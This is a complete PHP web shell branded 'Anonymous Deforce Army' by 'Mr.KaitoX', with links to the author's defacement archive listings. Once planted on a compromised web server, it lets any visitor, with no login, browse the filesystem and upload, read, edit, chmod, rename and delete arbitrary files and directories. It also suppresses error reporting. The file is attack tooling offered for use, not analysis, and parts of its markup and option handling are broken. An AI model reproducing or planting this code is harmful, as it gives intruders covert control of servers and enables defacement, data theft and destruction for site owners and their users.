<?php
error_reporting(0);
set_time_limit(0);

if(get_magic_quotes_gpc()){
foreach($_POST as $key=>$value){
$_POST[$key] = stripslashes($value);
}
}
echo '<!DOCTYPE HTML>
<html>
<head>
<link rel="shortcut icon" href="https://i.imgur.com/bWgfa6Z.jpg" type="image/jpg"> 
<body bgcolor="black"><center>
<link href="" rel="stylesheet" type="text/json_decode">
<title>~[ Anonymous Deforce Army ]~</title>
<style>
	
body{
background-colour: white;
}
#content tr:hover{
background-color: red;
text-shadow:0px 0px 12px #fff;
}
#content .first{
background-colour: red;
}
table{
border: 2px solid #f00;
width:700px;
border-collapse: collapse;
}
a{
color:green;
text-decoration: iceland;
}
a:hover{
color:blue;
text-shadow:0px 0px 10px #ffffff;
}
input,select,textarea{
border: 1px #c13e1c solid;
-moz-border-radius: 5px;
-webkit-border-radius:5px;
border-radius:5px;
}
</style>
</head>
<body>
     <center><br><br>
    	<img border="0" src="https://i.imgur.com/bWgfa6Z.jpg" width="240" height="240">
    </center>
    <h3><font color="white" Mr.KaitoX | Anonymous Deforce Army </h3></font.
    <div class="greetings">
        * ANONYMOUS DEFORCE ARMY *
    </div><br>
        ~ We Are Legion ~ <br><br>
    <div class="barlink">
~ | <a href="https://www.facebook.com/kaitoxspiker">Facebook</a> | ~
	<a href="https://www.youtube.com/kaitolegion">Youtube</a> | ~
| <a href="https://www.google.com/search?q=Hacked+By+Mr.KaitoX">Who am I</a> | ~
	<br>
	~ | <a href="http://zone-h.org/archive/notifier=mr.kaitox">Zone-H</a> | ~
 | <a href="https://www.defacer.id/archive/attacker/mr-kaitox">Defacer-ID</a> | ~
 | <a href="https://mirror-h.org/search/hacker/27132/">Mirror-H </a> | ~
    	
 | <a href="http://www.github.com/MrKaitoX">Github</a> | ~
 | <a href="http://www.gitlab.com/MrKaitoX">Gitlab</a> | ~
    </div>
<br>


<table width="770" border="4" cellpadding="3" align="center">';

echo '<tr><td><font color="white">Path : </font>';
if(isset($_GET['path'])){
$path = $_GET['path'];}
else{
$path = getcwd();
}
$path = str_replace('\\','/',$path);
$paths = explode('/',$path);
foreach($paths as $id=>$pat){
if($pat == '' && $id == 0){
$a = true;
echo '<a href="?path=/">/</a>';
continue;
}
if($pat == '') continue;
echo '<a href="?path=';
for($i=0;$i<=$id;$i++){
echo "$paths[$i]";
if($i != $id) echo "/";
}
echo '">'.$pat.'</a>/';
}

if(isset($_FILES['file'])){
if(copy($_FILES['file']['tmp_name'],$path.'/'.$_FILES['file']['name'])){
echo '<font color="cyan">Upload Success</font><br />';
}else{
echo '<font color="red">Upload Failed :<</font><br/>';
}
}
echo '<form enctype="multipart/form-data" method="POST">
<font color="white">File Upload :</font> <input type="file" name="file" />
<input type="submit" value="upload" />
</form>

</td></tr>';


if(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];

echo '</tr></td></table><br />';


echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="#b8cdea">[+] Permission Copy :D </font><br/>';
}else{
echo '<font color="#788fae">Yah Gagal Ganti Permission :( </font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Enter" />
</form>';
}elseif($_POST['opt'] == 'ganti nama'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="">Success Name copy :v</font><br/>';
}else{
echo '<font color="red">Failed copy :<</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Edit</font><br/>';
}else{
echo '<font color="red">Failed Edit :(</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Directory Removed :V </font><br/>';
}else{
echo '<font color="red">Directory Delete Failed :V                                                                                                                                                                                                                                                                                            </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">File Successfully Removed</font><br/>';
}else{
echo '<font color="red">File Failed To Delete :(</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content">

<table width="800" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center> Names </SCA></center></td>
<td><center> Bites </SCA></center></td>
<td><center> Permission Copy </peller></center></td>
<td><center> Modified </SCA></center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value=""> Menu </option>
<option value="delete"> Delete </option>
<option value="chmod"> Chmod </option>
<option value="rename"> Rename </option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value=""> Menu </option>
<option value="delete"> Delete </option>
<option value="chmod"> Chmod </option>
<option value="rename"> Rename </option>
<option value="edit"> Edit </option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/><size="6"Anonymous Deforce Army (C) 2018</center>
</body>
</html>';


function perms($file){
$perms = fileperms($file);

if (($perms & 0xC000) == 0xC000) {
// Socket
$info = 's';
} elseif (($perms & 0xA000) == 0xA000) {
// Symbolic Link
$info = 'l';
} elseif (($perms & 0x8000) == 0x8000) {
// Regular
$info = '-';
} elseif (($perms & 0x6000) == 0x6000) {
// Block special
$info = 'b';
} elseif (($perms & 0x4000) == 0x4000) {
// Directory
$info = 'd';
} elseif (($perms & 0x2000) == 0x2000) {
// Character special
$info = 'c';
} elseif (($perms & 0x1000) == 0x1000) {
// FIFO pipe
$info = 'p';
} else {
// Unknown
$info = 'u';
}

// Owner
$info .= (($perms & 0x0100) ? 'r' : '-');
$info .= (($perms & 0x0080) ? 'w' : '-');
$info .= (($perms & 0x0040) ?
(($perms & 0x0800) ? 's' : 'x' ) :
(($perms & 0x0800) ? 'S' : '-'));

// Group
$info .= (($perms & 0x0020) ? 'r' : '-');
$info .= (($perms & 0x0010) ? 'w' : '-');
$info .= (($perms & 0x0008) ?
(($perms & 0x0400) ? 's' : 'x' ) :
(($perms & 0x0400) ? 'S' : '-'));

// World
$info .= (($perms & 0x0004) ? 'r' : '-');
$info .= (($perms & 0x0002) ? 'w' : '-');
$info .= (($perms & 0x0001) ?
(($perms & 0x0200) ? 't' : 'x' ) :
(($perms & 0x0200) ? 'T' : '-'));

return $info;
}
?>
